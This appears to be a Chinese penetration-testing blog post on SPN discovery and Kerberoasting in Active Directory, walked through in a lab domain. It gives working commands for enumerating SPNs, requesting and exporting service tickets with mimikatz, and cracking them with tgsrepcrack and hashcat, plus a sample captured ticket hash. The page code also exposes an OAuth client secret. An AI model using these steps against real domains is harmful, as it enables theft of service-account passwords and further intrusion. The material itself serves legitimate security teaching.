<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="域渗透之SPN"><meta name="keywords" content="域渗透,SPN"><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>域渗透之SPN【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SPN格式"><span class="toc-number">1.</span> <span class="toc-text">SPN格式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SPN查询"><span class="toc-number">2.</span> <span class="toc-text">SPN查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SPN扫描"><span class="toc-number">3.</span> <span class="toc-text">SPN扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LDAP协议"><span class="toc-number">4.</span> <span class="toc-text">LDAP协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">5.</span> <span class="toc-text">Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting攻击方式一"><span class="toc-number">5.1.</span> <span class="toc-text">Kerberoasting攻击方式一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting攻击方式二"><span class="toc-number">5.2.</span> <span class="toc-text">Kerberoasting攻击方式二</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color2"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color8"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color5"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">200</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">域渗透之SPN</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-01-18 | 更新于 2020-04-13</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/SPN/">SPN</a></div></div></div><div class="main-content"><p>服务主体名称（SPN）是服务实例的唯一标识符。Kerberos身份验证使用SPN将服务实例与服务登录帐户关联。</p>
<p>如果您在整个林中的计算机上安装服务的多个实例，则每个实例必须具有自己的SPN。<br>在Kerberos身份验证服务可以使用SPN对服务进行身份验证之前，必须在该服务实例用于登录的帐户对象上注册SPN。</p>
<a id="more"></a>

<p>SPN的类别:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册在AD上机器帐户(Computers)下</span><br><span class="line">注册在域用户帐户(Users)下</span><br></pre></td></tr></table></figure>
<p>当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下;<br>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
<h1 id="SPN格式"><a href="#SPN格式" class="headerlink" title="SPN格式"></a>SPN格式</h1><p>SPN语法包含四个元素：两个必需元素和两个其他元素，您可以根据需要使用它们来产生唯一的名称</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;service class&gt;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;service name&gt;</span><br></pre></td></tr></table></figure>
<p>元素描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;service class&gt;：标识服务类的字符串,可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</span><br><span class="line">&lt;host&gt;：服务所在主机名称,有两种形式,这可以是标准DNS名称或NetBIOS名称，例如server01.test.com和server01</span><br><span class="line">&lt;port&gt;：服务端口</span><br><span class="line">&lt;service name&gt;：服务的专有名称（DN），objectGuid，Internet主机名</span><br></pre></td></tr></table></figure>
<h1 id="SPN查询"><a href="#SPN查询" class="headerlink" title="SPN查询"></a>SPN查询</h1><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -q *&#x2F;*   #查询当前域的所有SPN</span><br><span class="line">setspn -T rootkit.org -q *&#x2F;*  #查询 rookit.org域的所有SPN</span><br></pre></td></tr></table></figure>
<p>查询结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">CN&#x3D;OWA2013,OU&#x3D;Domain Controllers,DC&#x3D;rootkit,DC&#x3D;org</span><br><span class="line">        IMAP&#x2F;OWA2013</span><br><span class="line">        IMAP&#x2F;OWA2013.rootkit.org</span><br><span class="line">        IMAP4&#x2F;OWA2013</span><br><span class="line">        IMAP4&#x2F;OWA2013.rootkit.org</span><br><span class="line">        POP&#x2F;OWA2013</span><br><span class="line">        POP&#x2F;OWA2013.rootkit.org</span><br><span class="line">        POP3&#x2F;OWA2013</span><br><span class="line">        POP3&#x2F;OWA2013.rootkit.org</span><br><span class="line">        exchangeRFR&#x2F;OWA2013</span><br><span class="line">        exchangeRFR&#x2F;OWA2013.rootkit.org</span><br><span class="line">        exchangeMDB&#x2F;OWA2013</span><br><span class="line">        exchangeMDB&#x2F;OWA2013.rootkit.org</span><br><span class="line">        SMTP&#x2F;OWA2013</span><br><span class="line">        SMTP&#x2F;OWA2013.rootkit.org</span><br><span class="line">        SmtpSvc&#x2F;OWA2013</span><br><span class="line">        SmtpSvc&#x2F;OWA2013.rootkit.org</span><br><span class="line">        exchangeAB&#x2F;OWA2013</span><br><span class="line">        exchangeAB&#x2F;OWA2013.rootkit.org</span><br><span class="line">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04&#x2F;OWA2013.rootkit.org</span><br><span class="line">        ldap&#x2F;OWA2013.rootkit.org&#x2F;ForestDnsZones.rootkit.org</span><br><span class="line">        ldap&#x2F;OWA2013.rootkit.org&#x2F;DomainDnsZones.rootkit.org</span><br><span class="line">        TERMSRV&#x2F;OWA2013</span><br><span class="line">        TERMSRV&#x2F;OWA2013.rootkit.org</span><br><span class="line">        DNS&#x2F;OWA2013.rootkit.org</span><br><span class="line">        GC&#x2F;OWA2013.rootkit.org&#x2F;rootkit.org</span><br><span class="line">        RestrictedKrbHost&#x2F;OWA2013.rootkit.org</span><br><span class="line">        RestrictedKrbHost&#x2F;OWA2013</span><br><span class="line">        RPC&#x2F;58650e64-9681-4c62-b26e-7914b9041f72._msdcs.rootkit.org</span><br><span class="line">        HOST&#x2F;OWA2013&#x2F;ROOTKIT</span><br><span class="line">        HOST&#x2F;OWA2013.rootkit.org&#x2F;ROOTKIT</span><br><span class="line">        HOST&#x2F;OWA2013</span><br><span class="line">        HOST&#x2F;OWA2013.rootkit.org</span><br><span class="line">        HOST&#x2F;OWA2013.rootkit.org&#x2F;rootkit.org</span><br><span class="line">        E3514235-4B06-11D1-AB04-00C04FC2DCD2&#x2F;58650e64-9681-4c62-b26e-7914b9041f72&#x2F;rootkit.org</span><br><span class="line">        ldap&#x2F;OWA2013&#x2F;ROOTKIT</span><br><span class="line">        ldap&#x2F;58650e64-9681-4c62-b26e-7914b9041f72._msdcs.rootkit.org</span><br><span class="line">        ldap&#x2F;OWA2013.rootkit.org&#x2F;ROOTKIT</span><br><span class="line">        ldap&#x2F;OWA2013</span><br><span class="line">        ldap&#x2F;OWA2013.rootkit.org</span><br><span class="line">        ldap&#x2F;OWA2013.rootkit.org&#x2F;rootkit.org</span><br><span class="line">CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;rootkit,DC&#x3D;org</span><br><span class="line">        kadmin&#x2F;changepw</span><br><span class="line">CN&#x3D;dbadmin,OU&#x3D;运维部,DC&#x3D;rootkit,DC&#x3D;org</span><br><span class="line">        MSSQLSvc&#x2F;Srv-Web-Kit.rootkit.org:1433</span><br><span class="line">        MSSQLSvc&#x2F;Srv-Web-Kit.rootkit.org</span><br><span class="line">CN&#x3D;SRV-WEB-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org</span><br><span class="line">        TERMSRV&#x2F;SRV-WEB-KIT</span><br><span class="line">        TERMSRV&#x2F;Srv-Web-Kit.rootkit.org</span><br><span class="line">        WSMAN&#x2F;Srv-Web-Kit</span><br><span class="line">        WSMAN&#x2F;Srv-Web-Kit.rootkit.org</span><br><span class="line">        RestrictedKrbHost&#x2F;SRV-WEB-KIT</span><br><span class="line">        HOST&#x2F;SRV-WEB-KIT</span><br><span class="line">        RestrictedKrbHost&#x2F;Srv-Web-Kit.rootkit.org</span><br><span class="line">        HOST&#x2F;Srv-Web-Kit.rootkit.org</span><br><span class="line">CN&#x3D;PC-JERRY-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org</span><br><span class="line">        RestrictedKrbHost&#x2F;PC-JERRY-KIT</span><br><span class="line">        HOST&#x2F;PC-JERRY-KIT</span><br><span class="line">        RestrictedKrbHost&#x2F;PC-jerry-Kit.rootkit.org</span><br><span class="line">        HOST&#x2F;PC-jerry-Kit.rootkit.org</span><br><span class="line">CN&#x3D;PC-MICLE-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org</span><br><span class="line">        RestrictedKrbHost&#x2F;PC-MICLE-KIT</span><br><span class="line">        HOST&#x2F;PC-MICLE-KIT</span><br><span class="line">        RestrictedKrbHost&#x2F;PC-micle-Kit.rootkit.org</span><br><span class="line">        HOST&#x2F;PC-micle-Kit.rootkit.org</span><br><span class="line">CN&#x3D;PC-TORNDO-KIT,CN&#x3D;Computers,DC&#x3D;rootkit,DC&#x3D;org</span><br><span class="line">        HOST&#x2F;PC-TORNDO-KIT</span><br><span class="line">        HOST&#x2F;pc-torndo-Kit.rootkit.org</span><br></pre></td></tr></table></figure>
<p>发现存在 SPN!<br>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN</p>
<h1 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h1><p>可以通过 SPN 来获取想要的信息，比如想知道域内哪些主机安装了什么服务，就不需要再进行批量的网络端口扫描。相对于通常的网络端口扫描的优点是不用直接和服务主机建立连接，且隐蔽性更高。</p>
<p>powershell执行策略默认为Restricted，不允许执行脚本。<br>若要了解计算机上的powershell现用执行策略,请输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-executionpolicy</span><br></pre></td></tr></table></figure>
<p>若要在本地计算机上运行您编写的未签名脚本和来自其他用户的签名脚本，请使用以下命令将计算机上的执行策略更改为 RemoteSigned(需管理员权限)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set-executionpolicy remotesigned</span><br></pre></td></tr></table></figure>
<p>GetUserSPNs.ps1</p>
<p>GetUserSPNs 是 Kerberoast 工具集中的一个 powershell 脚本，用来查询域内注册的 SPN。<br>脚本下载:<a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a></p>
<p>SPN扫描<br>可以通过 SPN 来获取想要的信息，比如想知道域内哪些主机安装了什么服务，就不需要再进行批量的网络端口扫描。相对于通常的网络端口扫描的优点是不用直接和服务主机建立连接，且隐蔽性更高。</p>
<p>powershell执行策略默认为Restricted，不允许执行脚本。<br>若要了解计算机上的powershell现用执行策略,请输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-executionpolicy</span><br></pre></td></tr></table></figure>
<p>若要在本地计算机上运行您编写的未签名脚本和来自其他用户的签名脚本，请使用以下命令将计算机上的执行策略更改为 RemoteSigned(需管理员权限)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set-executionpolicy remotesigned</span><br></pre></td></tr></table></figure>
<p>GetUserSPNs.ps1</p>
<p>GetUserSPNs 是 Kerberoast 工具集中的一个 powershell 脚本，用来查询域内注册的 SPN。<br>脚本下载:<a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-module .\GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>
<p><img src="../../images/window/getuserspn.png" alt=""></p>
<h1 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h1><p>LDAP全称是Lightweight Directory Access Protocol，轻量目录访问协议。是一种用来查询与更新 Active Directory 的目录服务通信协议。AD 域服务利用 LDAP 命名路径（LDAP naming path）来表示对象在 AD 内的位置，以便用它来访问 AD 内的对象。</p>
<p>搬运daiker大佬文章中LDAP的介绍: <a href="https://www.anquanke.com/post/id/195100?from=singlemessage#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/195100?from=singlemessage#h2-1</a><br><img src="../../images/window/t01090405656313c00d.png" alt=""></p>
<ul>
<li>目录树：如上图所示，在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目。</li>
<li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）。比如图中的每个圆圈都是一条记录。</li>
<li>DN,RDN:比如说第一个叶子条目，他有一个唯一可区分的名称– — </li>
<li>DN:uid=bob,ou=people,dc=acme,dc=org。类似于文件目录的相对路径绝对路径，他除了有个DN之外，还有个RDN，他与目录结构无关，比如之前咱们提过的uid=bob,ou=people,dc=acme,dc=org，他的RDN就是uid=bob</li>
<li>属性：描述条目具体信息。比如 uid=bill,ou=people,dc=acme,dc=org，他有属性name 为bill，属性age为11，属性school 为xx。</li>
</ul>
<p><img src="../../images/window/t01dd7a04f000980716.png" alt=""></p>
<h1 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h1><p>介绍 Kerberos 的认证流程时说到，在 KRB_TGS_REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码。<br>下图为设置 Kerberos 的加密方式为RC4，在域中可以在域控的「本地安全策略」中进行设置：</p>
<p><img src="../../images/window/rc4.png" alt=""><br>设置完成之后运行里输入「gpupdate」刷新组策略，策略生效。</p>
<h2 id="Kerberoasting攻击方式一"><a href="#Kerberoasting攻击方式一" class="headerlink" title="Kerberoasting攻击方式一"></a>Kerberoasting攻击方式一</h2><p>获得有价值的SPN<br>需要满足以下条件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">该SPN注册在域用户帐户(Users)下</span><br><span class="line">域用户账户的权限很高</span><br></pre></td></tr></table></figure>
<p>1.获取SPN</p>
<p>powershell:<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
<p>vbs:<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure>

<p><img src="../../images/window/spn.png" alt=""><br>2.根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起 kerberos 请求，申请 ST 票据。   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc&#x2F;Srv-Web-Kit.rootkit.org&quot;</span><br></pre></td></tr></table></figure>
<p><img src="../../images/window/st1.png" alt=""><br>3.Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>
<p><img src="../../images/window/klist1.png" alt=""><br>4.mimicatz导出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rberos::list &#x2F;export</span><br></pre></td></tr></table></figure>
<p><img src="../../images/window/klistexport.png" alt=""><br>5.爆破密码</p>
<p>脚本:<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tgsrepcrack.py wordlist.txt 1-40a10000-jerry@MSSQLSvc~Srv-Web-Kit.rootkit.org-ROOTKIT.ORG.kirbi</span><br></pre></td></tr></table></figure>
<h2 id="Kerberoasting攻击方式二"><a href="#Kerberoasting攻击方式二" class="headerlink" title="Kerberoasting攻击方式二"></a>Kerberoasting攻击方式二</h2><p>Kerberoasting攻击方式一中需要通过 mimikatz 从内存中导出票据，Invoke-Kerberoast 通过提取票据传输时的原始字节，转换成 John the Ripper 或者 HashCat 能够直接爆破的字符串。</p>
<p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料<br><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
<p>脚本地址：<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-module .\Invoke-Kerberoast.ps1</span><br><span class="line">Invoke-kerberoast -outputformat hashcat |fl</span><br></pre></td></tr></table></figure>
<p>–outputformat 参数可以指定输出的格式，可选 John the Ripper 和 Hashcat 两种格式</p>
<p><img src="../../images/window/1.png" alt=""><br>利用hashcat爆破<br>工具下载:<a href="https://github.com/hashcat/hashcat" target="_blank" rel="noopener">https://github.com/hashcat/hashcat</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe  -m 13100 hash.txt dic.txt --force --show</span><br></pre></td></tr></table></figure>

<p>hash.txt内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*dbadmin$rootkit.org$MSSQLSvc&#x2F;Srv-Web-Kit.rootkit.org:1433*$d78f3a872b2e770bd7fed0a08386d791$2a356ecded8ad719cde070eb0c25bd1126dce5017acfb219135760a3890428da51667504789cb12c15fa61c71209ffc3ed0cd1d7e08cbeb4bb2bbc84d42bac53f4030bbf8fff011bcfcd76e2448f8b34f1431da0ba5f373c737d12004562b4242b099c2f27797cd682902f70f356f5fa629ea7c55458ebd230eaa19c56f596e1e1e6e2d37887bddca6243661c3d1d8e69420a3ab4427c56859d3858f6b4283fc268a1f4af161771d37858226a4d640f0cb45648760d7c5698cfbcc1e53003277e462937d09da38e8c1bfd698e6d6db5fc184fa9166c5bf8002cb061b53187612d597ad3a547b4a2b6cd474bcb894c6d1ff021299882dd4ba9d37fe5543bbb205b5941cb24891f3f1733dd012dda97a81d8cb0206bfca3b9ae8a0087466fb91b1bea820a3608f71eb90a50d46ca1944816242d75ddae569cdf33bad5fb8f5703c252dbfce22cfa8ab268d16671020044282f88119854a01500216364329e89b37367516d0f21f9d2f6b20b886e3a01424b90431ffc7782a21a6befe40514cdfb704c29a2bd25078e821209d914df46fb11c997c7cf9e0ec94c036466cd51351c132304ff8a2bbdd8120a955b7ef764169193c8915dc123d6c339a5c2d7bae301f0effdaaa604cc84a4f36f005bbbf64f1cb276b265fc953e7b3c09cdbc4ec102edd8907fcf812088e7ab7ab1d3d1efe07c899f9f590ee1a8fa7714e5b5e7b82b072aa46dae2bf9566cca99877932021b506ddb51e3162a576e155ff0c40e6eb1546b7713d355475c4df227864e4a3e7d12c3c0d6f1020f738b041c4717aa626ef8a3c9974bda28f2d058dfc2a90bd6aea7a6352c07999744e9b936b34b372ffd85153bec7ea17c80cab0ab0f165b638fc43917df16c8dc37d664d952cb615bbf95809bcc046761cefc39eb01b2b0160d31701ed33f3d9ffafafbf931c3f698ab57550da5fb50b009aa27e1dcb3fdfcf9d68b44882b065dedb15252c3762b2ff98c197e87f4a04831ed8dda78e71a9744a655fde06064a8a7b19caa0845436ceadc279e3d50fb21982d9303f96470705f85f4ab1544d54f2a39f98fc5bcab97ad124b7aeffb45ccb356c043ee2949bdffb1fe0607b608051bc300b736d1add8f2cf50f508fe8b3e624f1d512cff8ed1f894a2836ea9fc960c5a87933f793a1f059f51d640353e01eedfaf5b41a60ba2b779d7e27e29d83fc584cb3ad7c52d746c1fd1d8b38840d3533e9ab0dc96110d509ab41735253a3354c3bcaa97acde9f6f2d9abe6ca1cea1e4b9df500b0567215571d8360f5f55b1dda171c2db476e2888eee7dfefb9a22909729350a4307d1f606a5ddb615a29ea3b54194f216f92c2161e3d998044c811675e86f913140e0e2d290da20141a9fe488ea715c1562f6425e30b54261e44b8e83430456c2b11e08d227b209f4c992089d8ac633e59d0ccbe15e5c06</span><br></pre></td></tr></table></figure>
<p>爆破结果<br><img src="../../images/window/hashcat.png" alt=""></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/5dbd187a.html">https://blog.cfyqy.com/article/5dbd187a.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
